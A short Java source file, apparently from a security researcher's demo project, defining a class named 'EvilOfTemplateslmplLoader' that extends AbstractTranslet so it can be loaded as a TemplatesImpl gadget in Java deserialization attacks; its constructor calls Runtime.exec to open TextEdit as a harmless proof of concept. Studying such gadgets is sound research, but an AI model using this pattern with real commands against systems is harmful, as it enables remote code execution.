package URLClassLoaderDemo;

import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
import com.sun.org.apache.xml.internal.serializer.SerializationHandler;

import java.io.*;
/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 5:52 下午
 */
public class EvilOfTemplateslmplLoader extends AbstractTranslet {
    public EvilOfTemplateslmplLoader() throws IOException {
        Runtime.getRuntime().exec("open -a /System/Applications/TextEdit.app");
    }

    @Override
    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    }

    @Override
    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    }
}
